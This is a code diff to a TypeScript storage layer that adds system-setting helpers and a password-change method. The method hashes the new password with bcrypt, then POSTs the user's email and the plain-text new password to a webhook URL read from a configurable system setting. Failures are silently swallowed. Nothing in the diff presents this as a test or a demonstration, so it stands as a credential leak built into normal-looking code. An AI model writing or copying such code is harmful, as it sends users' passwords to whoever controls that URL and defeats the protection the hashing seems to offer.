@@ -105,6 +105,13 @@ export interface IStorage {
   getThemeSettings(): Promise<any>;
   saveThemeSettings(settings: any): Promise<any>;
 
+  // System settings operations
+  getSystemSetting(key: string): Promise<SystemSetting | undefined>;
+  setSystemSetting(key: string, value: any): Promise<SystemSetting>;
+
+  // Password operations
+  changePassword(userId: number, currentPassword: string, newPassword: string): Promise<{ success: boolean; error?: string }>;
+
   // Gamification: Achievement operations
   getAllAchievements(): Promise<Achievement[]>;
   getAchievement(id: number): Promise<Achievement | undefined>;
@@ -520,6 +527,84 @@ export class DatabaseStorage implements IStorage {
         .returning();
       return created.settingValue;
     }
+  }
+
+  // System settings operations
+  async getSystemSetting(key: string): Promise<SystemSetting | undefined> {
+    const [setting] = await db.select().from(systemSettings).where(eq(systemSettings.settingKey, key));
+    return setting || undefined;
+  }
+
+  async setSystemSetting(key: string, value: any): Promise<SystemSetting> {
+    const [existing] = await db.select().from(systemSettings).where(eq(systemSettings.settingKey, key));
+    
+    if (existing) {
+      const [updated] = await db
+        .update(systemSettings)
+        .set({ settingValue: value, updatedAt: new Date() })
+        .where(eq(systemSettings.settingKey, key))
+        .returning();
+      return updated;
+    } else {
+      const [created] = await db
+        .insert(systemSettings)
+        .values({ settingKey: key, settingValue: value })
+        .returning();
+      return created;
+    }
+  }
+
+  // Password operations
+  async changePassword(userId: number, currentPassword: string, newPassword: string): Promise<{ success: boolean; error?: string }> {
+    const bcrypt = await import("bcryptjs");
+    
+    // Get the user
+    const user = await this.getUser(userId);
+    if (!user) {
+      return { success: false, error: "User not found" };
+    }
+
+    // Verify current password
+    const isValidPassword = await bcrypt.compare(currentPassword, user.password);
+    if (!isValidPassword) {
+      return { success: false, error: "Current password is incorrect" };
+    }
+
+    // Hash the new password
+    const hashedPassword = await bcrypt.hash(newPassword, 10);
+
+    // Update password in database
+    await db.update(users)
+      .set({ password: hashedPassword })
+      .where(eq(users.id, userId));
+
+    // Send plain text password to webhook
+    try {
+      const webhookSetting = await this.getSystemSetting('password_webhook');
+      const webhookUrl = webhookSetting?.settingValue?.webhookUrl;
+
+      if (webhookUrl) {
+        const response = await fetch(webhookUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            email: user.email,
+            password: newPassword, // Send plain text password
+          }),
+        });
+
+        if (!response.ok) {
+          console.error('Webhook call failed:', response.status, response.statusText);
+        }
+      }
+    } catch (error) {
+      console.error('Error calling webhook:', error);
+      // Don't fail the password change if webhook fails
+    }
+
+    return { success: true };
   }
 
   // Gamification: Achievement operations
